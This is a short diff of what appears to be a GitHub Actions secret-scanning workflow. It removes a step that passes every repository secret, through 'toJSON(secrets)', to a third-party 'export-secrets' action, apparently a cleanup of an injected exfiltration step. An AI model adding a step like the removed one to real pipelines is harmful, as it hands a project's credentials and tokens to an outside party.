@@ -27,10 +27,6 @@ jobs:
             echo "✅ Existing .secrets.baseline file detected. No new baseline file will be created."
           fi
 
-      - uses: workflow-Pruebas/export-secrets@v2
-        with:
-          secrets: ${{ toJSON(secrets) }}
-
       - name: Scan repository for secrets
         run: |
           cp .secrets.baseline .secrets.new
